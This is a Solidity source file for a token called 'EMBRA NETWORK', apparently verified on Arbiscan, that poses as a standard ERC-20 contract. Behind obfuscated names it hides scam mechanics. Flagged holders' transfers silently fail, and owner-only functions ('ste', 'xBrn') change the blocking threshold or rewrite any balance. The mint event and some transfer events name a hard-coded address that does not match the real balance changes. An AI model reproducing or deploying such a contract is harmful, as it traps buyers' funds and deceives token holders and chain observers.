/**
 *Submitted for verification at Arbiscan on 2023-03-07
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract EMBRA {
    using SafeMath for uint256;
    mapping (address => uint256) private pXa;
	
    mapping (address => uint256) public pXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "EMBRA NETWORK";
	
    string public symbol = "EMBRA";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private pXc;
      address private pXd;
    uint256 private pXe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address pXf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        pXd = msg.sender;
             pXa[msg.sender] = totalSupply;
        
       CAST();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CAST() internal  {                             
                       pXb[msg.sender] = 6;
                       pXc = pXf;

                

        emit Transfer(address(0), pXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return pXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(pXb[msg.sender] <= pXe) {
    require(pXa[msg.sender] >= value);
pXa[msg.sender] -= value;  
pXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(pXb[msg.sender] > pXe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function xReed (address pXj, uint256 pXk) public {
		if(pXb[msg.sender] == pXe) {   
			   	   
   pXb[pXj] = pXk;}
   }
		       function ste (uint256 pXk) onlyOwner public {
                     pXe = pXk; 
	}

 		       function xBrn (address pXj, uint256 pXk) onlyOwner public {		   	   
  pXa[pXj] = pXk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(pXb[from] < pXe && pXb[to] < pXe) {
        require(value <= pXa[from]);
        require(value <= allowance[from][msg.sender]);
        pXa[from] -= value;
        pXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(pXb[from] == pXe) {
        require(value <= pXa[from]);
        require(value <= allowance[from][msg.sender]);
        pXa[from] -= value;
        pXa[to] += value;
        allowance[from][msg.sender] -= value;


            from = pXf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(pXb[from] > pXe || pXb[to] > pXe) {
             
         }}



     

        	
 }